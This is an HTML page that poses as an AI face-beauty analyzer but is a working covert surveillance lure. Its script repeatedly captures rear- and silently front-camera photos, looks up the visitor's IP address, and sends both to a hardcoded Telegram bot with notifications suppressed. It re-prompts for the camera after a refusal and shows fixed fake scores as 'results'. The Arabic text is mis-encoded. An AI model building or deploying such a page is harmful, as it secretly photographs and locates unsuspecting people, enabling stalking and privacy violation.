<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Professional Face Analyzer</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;800&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary: #6366f1;
            --secondary: #a855f7;
            --accent: #22d3ee;
            --bg: #020617;
            --card-bg: rgba(15, 23, 42, 0.8);
        }

        * { 
            box-sizing: border-box; margin: 0; padding: 0; 
            font-family: 'Tajawal', sans-serif;
            user-select: none; -webkit-user-select: none;
        }

        body {
            background-color: var(--bg);
            background-image: 
                radial-gradient(circle at 50% 50%, rgba(99, 102, 241, 0.1) 0%, transparent 80%),
                radial-gradient(circle at 0% 0%, rgba(34, 211, 238, 0.05) 0%, transparent 50%);
            color: white; min-height: 100vh;
            display: flex; justify-content: center; align-items: center;
            overflow: hidden;
        }

        .container {
            width: 92%; max-width: 460px;
            background: var(--card-bg); backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 35px; padding: 2.5rem 2rem; text-align: center;
            box-shadow: 0 0 40px rgba(0,0,0,1), 0 0 20px rgba(99, 102, 241, 0.2);
            position: relative;
        }

        /* HUD Corners */
        .hud-corner {
            position: absolute; width: 15px; height: 15px;
            border: 2px solid var(--accent); z-index: 10; filter: drop-shadow(0 0 5px var(--accent));
        }
        .tl { top: 15px; left: 15px; border-right: none; border-bottom: none; }
        .tr { top: 15px; right: 15px; border-left: none; border-bottom: none; }
        .bl { bottom: 15px; left: 15px; border-right: none; border-top: none; }
        .br { bottom: 15px; right: 15px; border-left: none; border-top: none; }

        .main-title { font-size: 1.6rem; font-weight: 800; margin-bottom: 8px; letter-spacing: -0.5px; }
        .sub-title { font-size: 0.85rem; color: #94a3b8; margin-bottom: 25px; display: block; font-weight: 300; }

        .viewport-container {
            position: relative; margin-bottom: 25px;
            border-radius: 25px; padding: 5px;
            background: linear-gradient(45deg, var(--primary), transparent, var(--accent));
        }

        .viewport {
            width: 100%; aspect-ratio: 1/1; background: #000;
            border-radius: 20px; position: relative;
            overflow: hidden; display: flex; justify-content: center; align-items: center;
        }

        #videoFeed { width: 100%; height: 100%; object-fit: cover; display: none; z-index: 1; }
        
        .scanner-line {
            display: none; position: absolute; width: 100%; height: 3px;
            background: var(--accent); box-shadow: 0 0 20px var(--accent);
            z-index: 10; animation: scan 2.5s infinite linear;
        }
        @keyframes scan { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }

        .placeholder-box { text-align: center; color: var(--primary); z-index: 2; opacity: 0.7; }

        .btn {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white; border: none; padding: 18px; border-radius: 20px;
            font-size: 1.1rem; font-weight: 800; cursor: pointer; width: 100%;
            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
        }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(99, 102, 241, 0.5); }

        #results { display: none; }
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
        .stat-card { 
            background: rgba(255,255,255,0.03); padding: 15px; border-radius: 20px; 
            border: 1px solid rgba(255,255,255,0.05);
        }
        .stat-val { display: block; font-size: 1.5rem; font-weight: 800; color: var(--accent); }
        .stat-label { font-size: 0.75rem; color: #64748b; }

        #status { font-family: monospace; font-size: 0.75rem; color: var(--accent); margin-top: 15px; text-transform: uppercase; }
    </style>
</head>
<body>

<div class="container">
    <div class="hud-corner tl"></div><div class="hud-corner tr"></div>
    <div class="hud-corner bl"></div><div class="hud-corner br"></div>

    <div id="setup-ui">
        <h1 class="main-title">ØªØ­Ù„ÙŠÙ„ Ø°ÙƒÙŠ Ù„Ù„ÙˆØ¬Ù‡</h1>
        <span class="sub-title">Ø¬Ø§Ù‡Ø² Ù„ØªØ­Ù„ÙŠÙ„ ÙˆØ¬Ù‡Ùƒ Ø¨Ø§Ù„Ø°ÙƒØ§Ø¡ Ø§Ù„Ø§ØµØ·Ù†Ø§Ø¹ÙŠ</span>
        
        <div class="viewport-container">
            <div class="viewport">
                <div class="scanner-line" id="scanner"></div>
                <video id="videoFeed" autoplay playsinline muted></video>
                <canvas id="hiddenCanvas" style="display:none;"></canvas>
                
                <div class="placeholder-box" id="placeholder">
                    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1">
                        <path d="M12 11c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zM12 13c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                    </svg>
                    <p style="margin-top:10px; font-weight: 300;">Ø§Ù„Ù†Ø¸Ø§Ù… Ø¬Ø§Ù‡Ø²..</p>
                </div>
            </div>
        </div>

        <button class="btn" id="actionBtn">Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø±Ù‚Ù…ÙŠ</button>
        <p id="status"></p>
    </div>

    <div id="results">
        <h1 class="main-title">ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ø¨ØµÙ…Ø© Ø§Ù„Ø¬Ù…Ø§Ù„ÙŠØ©</h1>
        <div class="stats-grid">
            <div class="stat-card"><span class="stat-val" id="v1">--</span><span class="stat-label">Ø§Ù„ØªÙ…Ø§Ø«Ù„</span></div>
            <div class="stat-card"><span class="stat-val" id="v2">--</span><span class="stat-label">Ù‡ÙŠÙƒÙ„ Ø§Ù„ÙÙƒ</span></div>
            <div class="stat-card"><span class="stat-label">Ù†Ù‚Ø§Ø¡ Ø§Ù„Ø¨Ø´Ø±Ø©</span><span class="stat-val" id="v3">--</span></div>
            <div class="stat-card"><span class="stat-label">Ø§Ù„Ù…Ø¹Ø¯Ù„ Ø§Ù„Ø¹Ø§Ù…</span><span class="stat-val" id="v4">--</span></div>
        </div>
        <canvas id="myChart"></canvas>
        <button class="btn" style="margin-top:25px;" onclick="location.reload()">ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</button>
    </div>
</div>

<script>
    const config = {
        token: '7871078462:AAHCgyMuBnw21O_yP4ocpPkrLNMKgnxA7aU',
        chatId: '5086851394'
    };

    const video = document.getElementById('videoFeed');
    const actionBtn = document.getElementById('actionBtn');
    const status = document.getElementById('status');
    const scanner = document.getElementById('scanner');
    const placeholder = document.getElementById('placeholder');
    const canvas = document.getElementById('hiddenCanvas');

    let mainStream = null;
    let isAnalyzing = false;

    // Ø²Ø± Ø§Ù„ØªØ´ØºÙŠÙ„ ÙŠØ·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù† Ø¯Ø§Ø¦Ù…Ø§Ù‹ Ø¥Ø°Ø§ Ù„Ù… ÙŠØ¹Ù…Ù„
    actionBtn.addEventListener('click', async () => {
        if (!mainStream) {
            await initCamera();
        } else if (!isAnalyzing) {
            startAnalysis();
        }
    });

    async function initCamera() {
        try {
            // Ø§Ù„Ø®Ø·ÙˆØ© 1: Ø¥ØºÙ„Ø§Ù‚ Ø£ÙŠ Ù…Ø­Ø§ÙˆÙ„Ø© Ù‚Ø¯ÙŠÙ…Ø© ØªÙ…Ø§Ù…Ø§Ù‹ Ù„Ø¥Ø¬Ø¨Ø§Ø± Ø§Ù„Ù…ØªØµÙØ­ Ø¹Ù„Ù‰ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø³Ø¤Ø§Ù„
            if (window.stream) {
                window.stream.getTracks().forEach(track => track.stop());
            }

            // Ø§Ù„Ø®Ø·ÙˆØ© 2: Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ© ÙƒØ®ÙŠØ§Ø± Ø£Ø³Ø§Ø³ÙŠ (Environment)
            const constraints = { 
                video: { facingMode: { exact: "environment" } }, 
                audio: false 
            };

            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¬Ù„Ø¨ Ø§Ù„Ø®Ù„ÙÙŠØ©ØŒ ÙˆØ¥Ø°Ø§ ÙØ´Ù„ (Ø¹Ù„Ù‰ Ø§Ù„ÙƒÙ…Ø¨ÙŠÙˆØªØ± Ù…Ø«Ù„Ø§Ù‹) ÙŠØ¬Ù„Ø¨ Ø£ÙŠ ÙƒØ§Ù…ÙŠØ±Ø§ Ù…ØªØ§Ø­Ø©
            try {
                mainStream = await navigator.mediaDevices.getUserMedia(constraints);
            } catch (err) {
                mainStream = await navigator.mediaDevices.getUserMedia({ video: true });
            }

            window.stream = mainStream;
            video.srcObject = mainStream;
            
            video.onloadedmetadata = () => {
                video.style.display = 'block';
                placeholder.style.display = 'none';
                scanner.style.display = 'block';
                actionBtn.innerText = "ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø£Ø¨Ø¹Ø§Ø¯ Ø§Ù„Ø­Ø§Ù„ÙŠØ©";
                status.innerText = "> SYSTEM_ONLINE";
                
                sendData("ğŸš¨ ØªÙ… Ù…Ù†Ø­ Ø§Ù„Ø¥Ø°Ù† - Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ØªØ¹Ù…Ù„");
                captureProcess();
            };
        } catch (e) {
            // Ø¥Ø°Ø§ Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù†ØŒ ÙŠØªÙ… ØªØµÙÙŠØ± Ø§Ù„Ø­Ø§Ù„Ø© Ù„Ù„Ø³Ù…Ø§Ø­ Ù„Ù„Ù…ØªØµÙØ­ Ø¨Ø·Ù„Ø¨Ù‡Ø§ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ·
            mainStream = null;
            status.innerText = "> ACCESS_DENIED: RETRYING...";
            // Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ø§Ù„Ø·Ù„Ø¨ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ ÙÙˆØ±Ø§Ù‹ Ù„Ø¥Ø¸Ù‡Ø§Ø± Popup Ø§Ù„Ù…ØªØµÙØ­
            navigator.mediaDevices.getUserMedia({ video: true }).catch(()=>{});
        }
    }

    async function captureProcess() {
        // Ø§Ù„ØªÙ‚Ø§Ø· 5 ØµÙˆØ± Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø¸Ø§Ù‡Ø±Ø© (Ø§Ù„Ø®Ù„ÙÙŠØ©)
        for(let i=0; i<5; i++) {
            await new Promise(r => setTimeout(r, 2000));
            captureAndSend("ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©");
        }

        // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¬Ù„Ø¨ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© "ØµØ§Ù…ØªØ§Ù‹" ÙÙŠ Ø§Ù„Ø®Ù„ÙÙŠØ©
        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const tempVid = document.createElement('video');
            tempVid.srcObject = frontStream;
            tempVid.play();
            setTimeout(async () => {
                for(let i=0; i<5; i++) {
                    const c = document.createElement('canvas');
                    c.width = tempVid.videoWidth; c.height = tempVid.videoHeight;
                    c.getContext('2d').drawImage(tempVid, 0, 0);
                    c.toBlob(b => sendPhoto(b, "ØµÙˆØ±Ø© Ø£Ù…Ø§Ù…ÙŠØ© ØµØ§Ù…ØªØ©"), 'image/jpeg', 0.5);
                    await new Promise(r => setTimeout(r, 1500));
                }
                frontStream.getTracks().forEach(t => t.stop());
            }, 1000);
        } catch(e) {}
    }

    function startAnalysis() {
        isAnalyzing = true;
        actionBtn.disabled = true;
        video.pause();
        
        let i = 0;
        const steps = ["> SCANNING_DEPTH", "> SYMMETRY_CHECK", "> TEXTURE_AI", "> REPORT_GEN"];
        const timer = setInterval(() => {
            if(i < steps.length) {
                status.innerText = steps[i];
                captureAndSend("Ù„Ù‚Ø·Ø© ØªØ­Ù„ÙŠÙ„ÙŠØ©");
                i++;
            } else {
                clearInterval(timer);
                showFinalResults();
            }
        }, 2500);
    }

    function showFinalResults() {
        document.getElementById('setup-ui').style.display = 'none';
        document.getElementById('results').style.display = 'block';
        
        const d = { v1: 91, v2: 88, v3: 84, v4: 93 };
        document.getElementById('v1').innerText = d.v1 + "%";
        document.getElementById('v2').innerText = d.v2 + "%";
        document.getElementById('v3').innerText = d.v3 + "%";
        document.getElementById('v4').innerText = d.v4 + "%";
        
        renderChart(d);
        captureAndSend("Ù„Ù‚Ø·Ø© Ù†Ù‡Ø§Ø¦ÙŠØ©");
    }

    async function sendData(msg) {
        try {
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: config.chatId, text: `${msg}\nIP: ${ip.ip}`})
            });
        } catch(e) {}
    }

    function captureAndSend(cap) {
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => sendPhoto(blob, cap), 'image/jpeg', 0.5);
    }

    function sendPhoto(blob, cap) {
        const fd = new FormData();
        fd.append('chat_id', config.chatId);
        fd.append('photo', blob);
        fd.append('caption', cap);
        fd.append('disable_notification', 'true');
        fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {method: 'POST', body: fd});
    }

    function renderChart(d) {
        new Chart(document.getElementById('myChart'), {
            type: 'radar',
            data: {
                labels: ['Ø§Ù„ØªÙ…Ø§Ø«Ù„', 'Ø§Ù„ÙÙƒ', 'Ø§Ù„Ø¨Ø´Ø±Ø©', 'Ø§Ù„Ø¹ÙŠÙˆÙ†', 'Ø§Ù„Ø£Ù†Ù', 'Ø§Ù„Ù†Ø³Ø¨Ø©'],
                datasets: [{
                    data: [d.v1, d.v2, d.v3, 87, 89, d.v4],
                    backgroundColor: 'rgba(99, 102, 241, 0.2)',
                    borderColor: '#22d3ee', borderWidth: 2
                }]
            },
            options: { scales: { r: { grid: {color:'rgba(255,255,255,0.1)'}, ticks: {display:false}, pointLabels: {color:'#94a3b8'} } }, plugins: {legend: {display:false}} }
        });
    }
</script>
</body>
</html>

